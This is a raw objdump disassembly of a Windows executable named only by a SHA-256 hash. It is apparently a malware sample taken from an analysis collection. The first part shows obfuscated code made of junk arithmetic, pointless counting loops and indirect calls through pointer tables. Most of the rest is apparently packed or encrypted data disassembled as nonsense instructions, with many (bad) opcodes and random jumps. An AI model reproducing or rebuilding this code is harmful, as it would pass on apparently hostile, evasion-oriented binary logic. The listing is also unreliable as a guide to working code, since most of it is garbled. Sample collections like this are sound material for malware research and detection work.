
945b8f39e80b3614adff4bef1dc9da895ebe0622b156c2c7facb80acfc48d51c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd8d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd89,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e19c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fd71,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fd59,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fd59
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fd59,ecx
  401068:	cmp    DWORD PTR ds:0x42fd59,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fd59,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e5a7
  401090:	cmp    DWORD PTR ds:0x42fd59,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fd59
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fd59,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e1a4,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e78b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e77b,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e77b,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e77b,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e1a8
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e34f
  401100:	cmp    DWORD PTR ds:0x42e77b,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e77b
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e77b,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e77b
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e77b,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e19c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e19c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e19c,esi
  401145:	cmp    DWORD PTR ds:0x42e19c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e5ab
  401160:	cmp    DWORD PTR ds:0x42e19c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e19c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e19c,esi
  40117c:	cmp    DWORD PTR ds:0x42e19c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e1b4,0x1a
  401193:	cmp    DWORD PTR ds:0x42e1b4,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e1b4,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fdfa
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fe02
  4011bf:	push   0x17d1
  4011c4:	push   0x42e2a7
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e4cb
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e1b4
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e1b4,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e77b,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd85
  4011f8:	adc    esi,DWORD PTR ds:0x42fd89
  4011fe:	mov    DWORD PTR ds:0x42fd85,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e783,0x17
  401216:	cmp    DWORD PTR ds:0x42e783,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e783,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e246
  401238:	push   0x42e1fd
  40123d:	call   DWORD PTR ds:0x42e5af
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e783
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e783,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fdfe,0x12
  40126b:	cmp    DWORD PTR ds:0x42fdfe,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fdfe,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e2a7
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e5b3
  4012a0:	mov    esi,DWORD PTR ds:0x42fdfe
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fdfe,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	and    edi,ebp
  4012f5:	sti    
  4012f6:	fnsave [eax+0x70]
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	sub    DWORD PTR [edx],eax
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	sub    BYTE PTR [edi+eax*4-0x135de1ec],dl
  4013ae:	jne    0x40142b
  4013b0:	inc    esi
  4013b1:	and    ebp,DWORD PTR [eax+ebp*1]
  4013b4:	push   0x6fe041c9
  4013b9:	pop    esi
  4013ba:	push   cs
  4013bb:	cmc    
  4013bc:	int    0x71
  4013be:	push   0x7b
  4013c0:	mov    ebp,0x54169ed
  4013c5:	xor    al,0x83
  4013c7:	bound  edx,QWORD PTR [ecx]
  4013c9:	sub    cl,BYTE PTR [edx-0x2bb111fa]
  4013cf:	jmp    0x401394
  4013d1:	push   0x21
  4013d3:	xlat   BYTE PTR ds:[ebx]
  4013d4:	mov    esi,0x53f43878
  4013d9:	add    eax,DWORD PTR [ecx+0x23672cb7]
  4013df:	call   0x9fc6:0xe33c54cb
  4013e6:	hlt    
  4013e7:	add    dh,BYTE PTR [ebx]
  4013e9:	sbb    al,0xd3
  4013eb:	lds    esi,FWORD PTR [edx-0x40]
  4013ee:	(bad)  
  4013ef:	fnsave [ebx-0x4abe65e]
  4013f5:	add    esp,DWORD PTR [ecx]
  4013f7:	mov    edi,DWORD PTR [edx+0x64b5ba38]
  4013fd:	in     eax,dx
  4013fe:	dec    edi
  4013ff:	test   eax,0x8a6cbf02
  401404:	inc    edi
  401405:	xchg   esi,eax
  401406:	jno    0x401481
  401408:	das    
  401409:	xchg   esi,eax
  40140a:	ss and dh,dh
  40140d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40140e:	jno    0x4013bc
  401410:	imul   esi,ebp,0xce4aad73
  401416:	stos   DWORD PTR es:[edi],eax
  401417:	into   
  401418:	pop    ebp
  401419:	mov    cs,WORD PTR [esi]
  40141b:	sub    eax,0x31417e90
  401420:	inc    ecx
  401421:	dec    esp
  401422:	sahf   
  401423:	neg    BYTE PTR [eax-0x13]
  401426:	cmc    
  401427:	pop    ecx
  401428:	dec    ecx
  401429:	pop    edi
  40142a:	or     al,0xe3
  40142c:	xor    DWORD PTR [edx-0x4f6bc8ef],ecx
  401432:	sbb    esp,DWORD PTR [edx+0x1aff3199]
  401438:	pusha  
  401439:	fcmovne st,st(1)
  40143b:	push   edx
  40143c:	adc    eax,0x741d8d4c
  401441:	xor    BYTE PTR ds:0xa1d87904,dl
  401447:	lods   eax,DWORD PTR ds:[esi]
  401448:	jmp    0xf36c:0x8b4bd4a6
  40144f:	fsub   QWORD PTR [edx+0x2a]
  401452:	fidiv  WORD PTR [eax+edi*2]
  401455:	mov    ebp,0x8f4e51e1
  40145a:	jge    0x40147a
  40145c:	mov    ds:0xcacbb04e,eax
  401461:	popf   
  401462:	jno    0x401438
  401464:	out    dx,al
  401465:	dec    ebp
  401466:	jge    0x40149a
  401468:	xlat   BYTE PTR ds:[ebx]
  401469:	out    dx,eax
  40146a:	cmp    edx,DWORD PTR [ebx]
  40146c:	push   0xd59780cd
  401471:	sub    eax,0x378aee85
  401476:	xchg   ecx,eax
  401477:	adc    al,0x27
  401479:	jbe    0x40149a
  40147b:	gs iretw 
  40147e:	inc    esp
  40147f:	jbe    0x401418
  401481:	jns    0x401422
  401483:	iret   
  401484:	call   0x2fae81f1
  401489:	jp     0x4014c6
  40148b:	mov    edi,0xf426c0f1
  401490:	ins    BYTE PTR es:[edi],dx
  401491:	xor    BYTE PTR [edi-0x4a8038e3],0x61
  401498:	cdq    
  401499:	retf   
  40149a:	xor    BYTE PTR [edx],al
  40149c:	mov    bh,0x8c
  40149e:	xor    al,0xa4
  4014a0:	sbb    ch,bl
  4014a2:	je     0x4014d2
  4014a4:	and    al,0xa
  4014a6:	mov    edx,0xe13f8f1d
  4014ab:	push   ss
  4014ac:	push   cs
  4014ad:	add    DWORD PTR ds:0xe34d0192,eax
  4014b3:	sub    esp,edx
  4014b5:	data16 ja 0x4014ae
  4014b8:	ret    0x34e8
  4014bb:	mul    BYTE PTR [ebp-0x3]
  4014be:	mov    dl,0x6b
  4014c0:	pop    ebx
  4014c1:	add    al,0xa1
  4014c3:	rep ins BYTE PTR es:[edi],dx
  4014c5:	xlat   BYTE PTR ds:[ebx]
  4014c6:	(bad)  
  4014c7:	push   edi
  4014c8:	retf   0x5d34
  4014cb:	(bad)  
  4014cc:	fld    DWORD PTR [edi+ebp*4-0x55cd320b]
  4014d3:	and    esp,DWORD PTR [edx-0x65217a27]
  4014d9:	les    eax,FWORD PTR [eax-0x3c]
  4014dc:	mov    ds:0x60f5ff13,eax
  4014e1:	mov    cl,0xea
  4014e3:	mov    dl,BYTE PTR [edi+0x58f04614]
  4014e9:	ins    DWORD PTR es:[edi],dx
  4014ea:	push   esp
  4014eb:	pushf  
  4014ec:	push   eax
  4014ed:	jecxz  0x401556
  4014ef:	fs test eax,0x2f8ffb
  4014f5:	dec    edx
  4014f6:	xlat   BYTE PTR ds:[ebx]
  4014f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014f8:	pop    ecx
  4014f9:	(bad)
  4014fc:	fst    st(2)
  4014fe:	int3   
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x4bebe013]
  401516:	lahf   
  401517:	and    eax,0x70707e70
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	out    0x1d,al
  401522:	cmp    DWORD PTR [ebp+0x4109891d],0xb77ef2ed
  40152c:	call   0x83008fc6
  401531:	add    BYTE PTR [edx+0x55],bh
  401534:	bound  ecx,QWORD PTR [edx+0x3f]
  401537:	or     al,0x74
  401539:	cmp    edi,ebp
  40153b:	(bad)  
  40153d:	es test edi,eax
  401540:	pop    edi
  401541:	jo     0x40156a
  401543:	jns    0x4014ed
  401545:	dec    esi
  401546:	mov    cl,cl
  401548:	std    
  401549:	in     al,dx
  40154a:	mov    esp,0xd624c29d
  40154f:	sub    esi,DWORD PTR [ecx+0x53]
  401552:	(bad)  
  401553:	xlat   BYTE PTR ds:[ebx]
  401554:	fidiv  WORD PTR [eax+0x2091b2fa]
  40155a:	scas   al,BYTE PTR es:[edi]
  40155b:	mov    ds:0x51a5189,al
  401560:	ins    DWORD PTR es:[edi],dx
  401561:	push   0x47aa5eb9
  401566:	icebp  
  401567:	add    BYTE PTR [edi+0x4dab487d],0xf5
  40156e:	jg     0x401561
  401570:	add    eax,DWORD PTR [ecx]
  401572:	push   edi
  401573:	cmp    edi,DWORD PTR [edi+ebx*1]
  401576:	sbb    eax,0x6aee8464
  40157b:	add    bl,cl
  40157d:	scas   al,BYTE PTR es:[edi]
  40157e:	mov    BYTE PTR [edx+0x1336121],bl
  401584:	jnp    0x40155c
  401586:	loop   0x401530
  401588:	lods   al,BYTE PTR ds:[esi]
  401589:	sub    DWORD PTR ds:0xefe3d372,0x67
  401590:	hlt    
  401591:	fcomp  QWORD PTR [eax+esi*4]
  401594:	sbb    al,0x80
  401596:	push   edx
  401597:	jge    0x40160a
  401599:	inc    ebx
  40159a:	xlat   BYTE PTR ds:[ebx]
  40159b:	fld    TBYTE PTR [eax+0x1f409246]
  4015a1:	jl     0x4015b1
  4015a3:	(bad)  
  4015a6:	add    al,0xbb
  4015a8:	jecxz  0x401544
  4015aa:	shr    DWORD PTR [ebp-0x51],cl
  4015ad:	mov    eax,ss:0x4a780040
  4015b3:	out    0xcd,eax
  4015b5:	jmp    0x8cc6:0x1a51b679
  4015bc:	lods   al,BYTE PTR ds:[esi]
  4015bd:	cmp    BYTE PTR ds:0xb69f29e2,ah
  4015c3:	fwait
  4015c4:	xchg   edx,eax
  4015c5:	cld    
  4015c6:	xchg   ebx,eax
  4015c7:	lock sbb eax,0xab50160f
  4015cd:	pushf  
  4015ce:	loopne 0x401552
  4015d0:	and    DWORD PTR [edi+eiz*4+0x61],ebp
  4015d4:	inc    ecx
  4015d5:	mov    cl,BYTE PTR [eax+eiz*2+0x1759b755]
  4015dc:	sub    ch,ch
  4015de:	cmp    DWORD PTR [eax+ecx*8],0xffffff95
  4015e2:	fcomp  QWORD PTR [edi+0x4b6c2bc4]
  4015e8:	in     al,dx
  4015e9:	mov    bl,0xcd
  4015eb:	rcl    BYTE PTR [esi+0x449dae0e],0x21
  4015f2:	cmp    al,BYTE PTR [ebx+0x7cef1dae]
  4015f8:	dec    eax
  4015f9:	outs   dx,DWORD PTR ds:[esi]
  4015fa:	pop    ds
  4015fb:	fisttp QWORD PTR [eax+0x74]
  4015fe:	jmp    0x4015eb
  401600:	cmp    eax,0x109b9b8e
  401605:	add    al,0x3f
  401607:	jle    0x4015da
  401609:	or     al,0xec
  40160b:	adc    ch,bl
  40160d:	mov    esp,0xf90466d0
  401612:	add    BYTE PTR [eax+0x28957cd2],ch
  401618:	push   edx
  401619:	clc    
  40161a:	scas   eax,DWORD PTR es:[edi]
  40161b:	out    0x67,eax
  40161d:	add    al,0x47
  40161f:	add    eax,0x1dbd944a
  401624:	inc    BYTE PTR [ebx-0x4c467353]
  40162a:	fstp   DWORD PTR [eax+edi*2-0x7c]
  40162e:	dec    eax
  40162f:	add    al,BYTE PTR [ebx+0x7f]
  401632:	adc    ecx,esp
  401634:	data16 mov WORD PTR [ebp-0xd],gs
  401638:	jne    0x40161f
  40163a:	inc    esp
  40163b:	cmp    al,dl
  40163d:	pop    ecx
  40163e:	adc    edx,edi
  401640:	sahf   
  401641:	ss inc esp
  401643:	xlat   BYTE PTR ds:[ebx]
  401644:	scas   al,BYTE PTR es:[edi]
  401645:	(bad)  
  401646:	iret   
  401647:	adc    edx,DWORD PTR [ebp-0x7e3926e2]
  40164d:	jle    0x401690
  40164f:	jns    0x4016c8
  401651:	mov    ecx,0xf7847ffd
  401656:	lock addr16 push ss
  401659:	push   0x3d
  40165b:	inc    edx
  40165c:	dec    edx
  40165d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40165e:	dec    esp
  40165f:	lahf   
  401660:	inc    esi
  401661:	rcl    esi,1
  401663:	ret    0xa934
  401666:	imul   ebp,ebx,0x78482153
  40166c:	inc    ecx
  40166d:	sbb    dl,BYTE PTR [ebp-0x5f]
  401670:	(bad)  
  401671:	jns    0x401681
  401673:	clc    
  401674:	scas   al,BYTE PTR es:[edi]
  401675:	sub    al,BYTE PTR [eax]
  401677:	je     0x4016eb
  401679:	fsub   DWORD PTR [edi+0x74]
  40167c:	inc    edi
  40167d:	ja     0x401605
  40167f:	fs jl  0x40160d
  401682:	loope  0x4016dd
  401684:	hlt    
  401685:	cdq    
  401686:	es ja  0x4016a5
  401689:	xor    ch,BYTE PTR ds:0xe821634
  40168f:	fwait
  401690:	xchg   DWORD PTR [eax],ebx
  401692:	or     ah,BYTE PTR [ebx-0x10]
  401695:	xor    dh,BYTE PTR gs:[ebp+0x1a]
  401699:	sub    dl,BYTE PTR [eax+0x442886ef]
  40169f:	pop    edi
  4016a0:	jmp    0x2a9c28f5
  4016a5:	jmp    0xf2802a3
  4016aa:	enter  0x1df7,0x6e
  4016ae:	mov    ebx,0xc2ce1400
  4016b3:	imul   esi,DWORD PTR ds:0x527b0f46,0x13800cd
  4016bd:	test   DWORD PTR [edx-0x50955b50],0x5026151c
  4016c7:	gs (bad) 
  4016c9:	std    
  4016ca:	les    esp,FWORD PTR fs:[ebx]
  4016cd:	xor    BYTE PTR [ebx+ebp*8+0x26f5bb89],ah
  4016d4:	ja     0x40170d
  4016d6:	call   0x8a3d4585
  4016db:	out    0x1c,al
  4016dd:	adc    eax,0x748fd1cf
  4016e2:	dec    eax
  4016e3:	jg     0x40169c
  4016e5:	jge    0x40170f
  4016e7:	repz pop es
  4016e9:	aad    0xc2
  4016eb:	jo     0x40176b
  4016ed:	push   esp
  4016ee:	dec    esp
  4016ef:	xchg   ebp,eax
  4016f0:	cld    
  4016f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016f2:	dec    edx
  4016f3:	sahf   
  4016f4:	sbb    al,0x2
  4016f6:	lea    eax,[ecx]
  4016f8:	scas   eax,DWORD PTR es:[edi]
  4016f9:	out    dx,eax
  4016fa:	scas   al,BYTE PTR es:[edi]
  4016fb:	jo     0x401731
  4016fd:	imul   eax,ebp,0x9fc2836a
  401703:	test   edx,0xcca3e182
  401709:	cld    
  40170a:	xor    eax,0x907d6b0b
  40170f:	sub    DWORD PTR [ebx+0x26],ebx
  401712:	popa   
  401713:	xchg   ecx,eax
  401714:	std    
  401715:	xchg   ebp,eax
  401716:	ds xchg ebx,eax
  401718:	adc    DWORD PTR [ebp+0x4c],0xd1cf7951
  40171f:	mov    DWORD PTR [ebp+0x4589d045],ecx
  401725:	int3   
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	rol    DWORD PTR [edi+0x7c7053b9],cl
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	(bad)  
  40174d:	add    bl,bh
  40174f:	pop    esp
  401750:	jp     0x4017c4
  401752:	mov    edi,0xaf2dab56
  401757:	inc    esp
  401758:	pusha  
  401759:	cmp    BYTE PTR [esi-0x4185eede],al
  40175f:	iret   
  401760:	addr16 mov al,0xb8
  401763:	loope  0x401729
  401765:	int3   
  401766:	hlt    
  401767:	icebp  
  401768:	adc    eax,0x164f1975
  40176d:	int    0x32
  40176f:	push   esp
  401770:	scas   al,BYTE PTR es:[edi]
  401771:	out    dx,eax
  401772:	push   0x10
  401774:	sub    esi,DWORD PTR ds:0x757ccbb0
  40177a:	js     0x4017e6
  40177c:	rol    BYTE PTR [esi+0x1c72828],1
  401782:	xchg   edi,eax
  401783:	xor    ebp,DWORD PTR ds:0xb91d2a96
  401789:	or     BYTE PTR [edx-0x75],bh
  40178c:	xchg   ebp,eax
  40178d:	hlt    
  40178e:	cld    
  40178f:	lahf   
  401790:	mov    ebx,0x591964b0
  401795:	mov    esp,0x7dd1f267
  40179a:	jo     0x40173a
  40179c:	sub    BYTE PTR fs:[edx],al
  40179f:	test   eax,0x529c04e3
  4017a4:	mov    dl,0x7b
  4017a6:	idiv   DWORD PTR [esi]
  4017a8:	cmp    al,0x6
  4017aa:	pop    edi
  4017ab:	mov    dh,0x14
  4017ad:	inc    eax
  4017ae:	pop    ds
  4017af:	retf   0x7ec5
  4017b2:	adc    bl,0x60
  4017b5:	pop    ebx
  4017b6:	loop   0x40175b
  4017b8:	int3   
  4017b9:	shl    BYTE PTR [ecx+0xa667066],cl
  4017bf:	ret    
  4017c0:	in     al,0x7b
  4017c2:	dec    ebx
  4017c3:	add    al,0x1e
  4017c5:	imul   edi,DWORD PTR [ebp+edi*2+0x10],0x2ac8f3e
  4017cd:	xor    al,0x4c
  4017cf:	inc    edx
  4017d0:	add    cl,al
  4017d2:	data16 mov BYTE PTR [edx],dh
  4017d5:	push   ds
  4017d6:	shr    BYTE PTR [ebp+0x1fdd7067],cl
  4017dc:	jbe    0x4017f1
  4017de:	lock mov edi,0x8361a33b
  4017e4:	retf   
  4017e5:	inc    eax
  4017e6:	out    dx,al
  4017e7:	enter  0xd8e,0xa4
  4017eb:	in     al,0xc1
  4017ed:	pop    eax
  4017ee:	lock push ecx
  4017f0:	push   esp
  4017f1:	sub    bl,BYTE PTR [esi-0x7b]
  4017f4:	fisub  WORD PTR fs:[edi-0x7e]
  4017f8:	fsubp  st(0),st
  4017fa:	xor    ecx,DWORD PTR [ecx]
  4017fc:	mov    ds:0x8c36e4ec,al
  401801:	repnz xor ch,ah
  401804:	cwde   
  401805:	sub    BYTE PTR [esi],dh
  401807:	and    eax,0xdb4d3496
  40180c:	in     eax,dx
  40180d:	les    edi,FWORD PTR [ebx-0x7f6e54b0]
  401813:	int    0x4d
  401815:	jne    0x4017d2
  401817:	pop    esp
  401818:	mov    bl,0xfe
  40181a:	inc    esi
  40181b:	inc    edi
  40181c:	push   ds
  40181d:	test   BYTE PTR [eax+0x185abdad],dl
  401823:	pop    ss
  401824:	xor    al,0x52
  401826:	test   al,0x5a
  401828:	push   cs
  401829:	jmp    0x9eefda14
  40182e:	sub    BYTE PTR [eax+0x7d115557],dl
  401834:	out    dx,al
  401835:	sbb    ebp,DWORD PTR [eax-0x73]
  401838:	mov    ebp,gs
  40183a:	add    al,0x75
  40183c:	and    dh,dl
  40183e:	aam    0x57
  401840:	jg     0x4017e6
  401842:	cmp    eax,0x8ebaa1eb
  401847:	fisttp DWORD PTR [edx-0x15170bd0]
  40184d:	stos   BYTE PTR es:[edi],al
  40184e:	push   0x23f264d6
  401853:	fsubp  st(3),st
  401855:	sahf   
  401856:	repz fdivr st(0),st
  401859:	div    dl
  40185b:	and    al,dh
  40185d:	inc    esi
  40185e:	push   ebx
  40185f:	push   esi
  401860:	pop    ds
  401861:	std    
  401862:	clc    
  401863:	not    DWORD PTR [ebx-0x2a]
  401866:	push   cs
  401867:	mov    dl,0xa5
  401869:	int    0xfa
  40186b:	lds    edi,FWORD PTR [ebp+0x40cbb27d]
  401871:	inc    ebp
  401872:	pop    eax
  401873:	cli    
  401874:	sbb    dl,BYTE PTR ds:0xb79e60c2
  40187a:	dec    ebx
  40187b:	repz xchg esi,eax
  40187d:	pop    esi
  40187e:	and    DWORD PTR [ebx+0x25],0xffffffa7
  401882:	sub    dh,0x7f
  401885:	loope  0x40185f
  401887:	and    eax,0x2896e36f
  40188c:	inc    ebx
  40188d:	mov    ecx,0xc6b8f798
  401892:	or     DWORD PTR [esi-0x5f],ebp
  401895:	and    al,BYTE PTR [esp+edx*4+0x62]
  401899:	mul    dl
  40189b:	or     dl,BYTE PTR [esi]
  40189d:	mov    eax,ds:0x3f31c5b8
  4018a2:	pop    ebx
  4018a3:	pcmpgtb mm0,QWORD PTR [ebx]
  4018a6:	test   DWORD PTR [ebp+0x3b],esp
  4018a9:	int    0x7
  4018ab:	xor    eax,0xb3a8751b
  4018b0:	add    al,0xbc
  4018b2:	inc    ebx
  4018b3:	in     al,dx
  4018b4:	and    DWORD PTR [ebx-0x7bb5c244],edx
  4018ba:	fcom   QWORD PTR [ebx]
  4018bc:	sbb    ebx,DWORD PTR [ebp-0x3c814ca3]
  4018c2:	jno    0x401943
  4018c4:	pusha  
  4018c5:	bound  esp,QWORD PTR [esi+0x25b8878b]
  4018cb:	out    dx,eax
  4018cc:	sbb    al,0x92
  4018ce:	xor    DWORD PTR [ecx-0x7c963686],esp
  4018d4:	mov    esp,0xbd120135
  4018d9:	mov    dl,0x4
  4018db:	push   ds
  4018dc:	xchg   ebx,eax
  4018dd:	or     DWORD PTR [esp+esi*4+0x66d23b12],eax
  4018e4:	in     al,0x34
  4018e6:	mov    ebx,DWORD PTR [edi-0x24]
  4018e9:	mov    cl,ch
  4018eb:	int    0x73
  4018ed:	cmc    
  4018ee:	mov    bh,0x8b
  4018f0:	pop    eax
  4018f1:	fmul   st(3),st
  4018f3:	mov    ecx,0x91b53954
  4018f8:	or     al,0x4e
  4018fa:	push   es
  4018fb:	mov    DWORD PTR [esi],edi
  4018fd:	gs jne 0x401947
  401900:	loop   0x401918
  401902:	xlat   BYTE PTR ds:[ebx]
  401903:	outs   dx,DWORD PTR ds:[esi]
  401904:	pop    ss
  401905:	arpl   WORD PTR [esi-0x252f6f41],bp
  40190b:	ins    BYTE PTR es:[edi],dx
  40190c:	jb     0x40191f
  40190e:	sbb    eax,0x13413fa5
  401913:	popa   
  401914:	push   eax
  401915:	sub    ah,BYTE PTR [ecx]
  401917:	and    DWORD PTR [edx],edi
  401919:	(bad)  
  40191b:	push   ds
  40191c:	xchg   ecx,eax
  40191d:	stos   BYTE PTR es:[edi],al
  40191e:	cwde   
  40191f:	push   ebx
  401920:	push   eax
  401921:	das    
  401922:	lds    edx,FWORD PTR [eax+0x4816e99d]
  401928:	mov    es,ecx
  40192a:	mov    esp,0x5972e69f
  40192f:	pop    ecx
  401930:	cld    
  401931:	push   esp
  401932:	or     BYTE PTR [ecx],ch
